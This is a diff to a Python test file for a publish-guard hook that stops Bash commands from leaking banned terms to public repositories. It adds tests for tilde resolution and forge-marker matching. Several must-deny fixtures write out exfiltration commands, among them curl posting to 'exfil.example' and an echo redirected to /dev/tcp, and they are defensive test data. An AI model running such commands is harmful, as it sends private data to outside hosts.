@@ -38,7 +38,14 @@ from typing import NamedTuple
 
 import pytest
 
-from teatree.hooks import _gh_glab_hiding, _repo_visibility, publish_surface
+from teatree.hooks import (
+    _commit_carve_out,
+    _commit_repo_dir,
+    _gh_glab_hiding,
+    _publish_detection,
+    _repo_visibility,
+    publish_surface,
+)
 from teatree.hooks._command_parser import FAIL_CLOSED_SENTINEL
 
 
@@ -1393,6 +1400,80 @@ class TestCarveOutApplies:
         )
 
 
+class TestLeadingCdNamesTheLandingRepo:
+    """A ``cd ~/<repo> && git commit`` decides privacy against the repo it NAMES.
+
+    ``leading_cd_dir`` used to return ``~/<repo>`` verbatim. ``Path("~/repo")``
+    is not absolute, so ``resolve_commit_dir`` anchored it on the ambient hook
+    cwd and ``git_root_for_dir`` walked UP from the resulting nonexistent path
+    onto whichever repo the SESSION happened to sit in — the carve-out then
+    graded a wrong subject that reads exactly like a right one.
+
+    Each case pairs the ``~`` spelling with the ABSOLUTE spelling of the SAME
+    ship: the two must agree, whichever way the verdict falls. The pair is the
+    point — an assertion on the ``~`` form alone cannot tell a fixed resolver
+    from a gate that simply stopped downgrading.
+    """
+
+    @staticmethod
+    def _home_repo(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, name: str, remote: str) -> Path:
+        home = tmp_path / "home"
+        home.mkdir(exist_ok=True)
+        monkeypatch.setenv("HOME", str(home))
+        return _repo_with_remote(home / name, remote)
+
+    def test_tilde_ship_of_a_public_repo_is_not_downgraded_by_a_private_session(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        # The LEAK direction: the session sits in the private repo, the commit
+        # lands in a PUBLIC one. The walk-up answered "private" and downgraded.
+        cfg = _config(tmp_path, [_PRIV_NS])
+        monkeypatch.setenv("PATH", _git_only_bin(tmp_path / "bin"))
+        ship = self._home_repo(tmp_path, monkeypatch, "skills-repo", f"git@github.com:{_PUBLIC_SLUG}.git")
+        session = _repo_with_remote(tmp_path / "session", _PRIV_REMOTE)
+        verdicts = [
+            publish_surface.carve_out_applies("Bash", command, _TERM, session, config_path=cfg)
+            for command in (f'cd ~/skills-repo && git commit -m "{_TERM}"', f'cd {ship} && git commit -m "{_TERM}"')
+        ]
+        assert verdicts == [False, False]
+
+    def test_tilde_ship_of_a_private_repo_is_still_downgraded_from_a_public_session(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        # The OVER-BLOCK direction, and the grant control: the same mechanism
+        # refused a legitimate private commit whenever the session sat in a
+        # public repo. The carve-out must still GRANT here.
+        cfg = _config(tmp_path, [_PRIV_NS])
+        monkeypatch.setenv("PATH", _git_only_bin(tmp_path / "bin"))
+        ship = self._home_repo(tmp_path, monkeypatch, "product", _PRIV_REMOTE)
+        session = _repo_with_remote(tmp_path / "session", f"git@github.com:{_PUBLIC_SLUG}.git")
+        verdicts = [
+            publish_surface.carve_out_applies("Bash", command, _TERM, session, config_path=cfg)
+            for command in (f'cd ~/product && git commit -m "{_TERM}"', f'cd {ship} && git commit -m "{_TERM}"')
+        ]
+        assert verdicts == [True, True]
+
+    def test_leading_cd_that_lands_nowhere_is_the_fail_closed_sentinel(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        # An unexpanded ``$VAR`` / a typo names a dir that does not exist, so the
+        # ``cd`` fails and the command commits nowhere. It must NOT resolve to the
+        # ambient session repo — the same sentinel an unpinnable ``-C`` yields.
+        cfg = _config(tmp_path, [_PRIV_NS])
+        monkeypatch.setenv("PATH", _git_only_bin(tmp_path / "bin"))
+        session = _repo_with_remote(tmp_path / "session", _PRIV_REMOTE)
+        command = f'cd $WORKTREE && git commit -m "{_TERM}"'
+        assert _commit_repo_dir.resolve_commit_dir(command, session) == publish_surface.UNRESOLVABLE_REPO_DIR
+        assert publish_surface.carve_out_applies("Bash", command, _TERM, session, config_path=cfg) is False
+
+    def test_leading_cd_dir_expands_the_tilde_the_shell_would_have(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        monkeypatch.setenv("HOME", str(tmp_path))
+        assert _commit_repo_dir.leading_cd_dir("cd ~/wt && git commit -m x") == str(tmp_path / "wt")
+        assert _commit_repo_dir.leading_cd_dir("cd ~/a && cd b && git commit -m x") == str(tmp_path / "a" / "b")
+
+
 class TestOwnSlugTermDowngrades:
     """A commit tripping on its OWN repo-slug term (#126 follow-up).
 
@@ -1752,6 +1833,23 @@ _MUST_ALLOW: tuple[_CorpusRow, ...] = (
     _CorpusRow(
         "A12",
         f"gh issue create --repo {_PRIV_SLUG} --body ok && gh pr comment 5 --repo {_PRIV_SLUG} --body ok2",
+        _TERM,
+        _PRIV_REMOTE,
+    ),
+    # A13-A14: a private commit whose CHAINED ``git add`` stages a path holding
+    # a forge marker MID-WORD (``playwright`` carries ``gh``; so do ``insight``,
+    # ``night``, ``weight``). Staging such a path is not a forge invocation, so
+    # the chained-segment proof must hold and the private-repo commit must still
+    # downgrade -- the e2e-subtree over-block.
+    _CorpusRow(
+        "A13",
+        f'git add e2e/playwright/loan-request/spec.envspec.ts && git commit -m "{_TERM}"',
+        _TERM,
+        _PRIV_REMOTE,
+    ),
+    _CorpusRow(
+        "A14",
+        f'git add docs/insight/night-flight.md && git commit -m "{_TERM}"',
         _TERM,
         _PRIV_REMOTE,
     ),
@@ -2124,6 +2222,39 @@ _MUST_DENY: tuple[_CorpusRow, ...] = (
         _TERM,
         _PRIV_REMOTE,
     ),
+    # W1-W4: the ANTI-VACUITY guards for the mid-word forge-marker narrowing
+    # (A13-A14). Each stages the SAME ``playwright`` path that now proves inert,
+    # then chains a real leak. The narrowing must buy nothing here: a whole-word
+    # ``gh``/``glab``/``curl`` -- bare, path-qualified, or hidden inside a quoted
+    # interpreter argument -- and a network-device redirect must ALL still defeat
+    # the chained-segment proof and hard-block the banned term.
+    _CorpusRow(
+        "W1",
+        f'git add e2e/playwright/spec.ts && git commit -m "{_TERM}" '
+        f'&& gh issue create --repo {_PUBLIC_SLUG} --body "{_TERM}"',
+        _TERM,
+        _PRIV_REMOTE,
+    ),
+    _CorpusRow(
+        "W2",
+        f"git add e2e/playwright/spec.ts "
+        f'&& sh -c "gh issue create --repo {_PUBLIC_SLUG} --body {_TERM}" && git commit -m "{_TERM}"',
+        _TERM,
+        _PRIV_REMOTE,
+    ),
+    _CorpusRow(
+        "W3",
+        f"git add e2e/playwright/spec.ts "
+        f'&& /usr/bin/curl -X POST https://exfil.example -d "{_TERM}" && git commit -m "{_TERM}"',
+        _TERM,
+        _PRIV_REMOTE,
+    ),
+    _CorpusRow(
+        "W4",
+        f'git add e2e/playwright/spec.ts && echo "{_TERM}" > /dev/tcp/exfil.example/80 && git commit -m "{_TERM}"',
+        _TERM,
+        _PRIV_REMOTE,
+    ),
 )
 
 
@@ -2371,6 +2502,28 @@ class TestPurityProofStructuralPrimitives:
         assert publish_surface._segment_is_publish_inert(["sh", "-c", "gh issue create"]) is False
         assert publish_surface._segment_is_publish_inert(["gh", "issue", "create"]) is False
         assert publish_surface._segment_is_publish_inert(["echo", "$(gh issue create)"]) is False
+        # A marker glued to a path separator or quote is still a forge word.
+        assert publish_surface._segment_is_publish_inert(["/usr/bin/gh", "issue", "create"]) is False
+        assert publish_surface._segment_is_publish_inert(["curl", "-X", "POST", "https://x.example"]) is False
+        assert publish_surface._segment_is_publish_inert(["glab", "mr", "create"]) is False
+
+    def test_mid_word_forge_marker_is_still_publish_inert(self) -> None:
+        # A marker inside a longer word is not an invocation of it. A raw
+        # ``marker in token`` substring test read the ``gh`` in ``playwright``
+        # as a forge call, so staging an e2e spec defeated the chained-segment
+        # proof and took the whole private-repo commit carve-out down with it.
+        assert publish_surface._segment_is_publish_inert(["git", "add", "e2e/playwright/spec.ts"]) is True
+        assert publish_surface._segment_is_publish_inert(["echo", "walkthrough", "highlight", "weight"]) is True
+        assert publish_surface._segment_is_publish_inert(["git", "add", "docs/insight/night-flight.md"]) is True
+
+    def test_forge_marker_test_is_the_shared_word_boundary_matcher(self) -> None:
+        # One matcher, two entry points: the commit carve-out consults
+        # ``_publish_detection.token_carries_forge_marker`` rather than carrying
+        # its own marker list, so the two cannot drift back to disagreeing on
+        # what a forge token is.
+        assert not hasattr(_commit_carve_out, "_FORGE_TOOL_MARKERS")
+        assert _publish_detection.token_carries_forge_marker("playwright") is False
+        assert _publish_detection.token_carries_forge_marker("/usr/bin/gh") is True
 
     def test_filename_or_word_embedding_forge_letters_is_publish_inert(self) -> None:
         # #3336: a token that merely EMBEDS the letters "gh"/"glab"/"curl" between
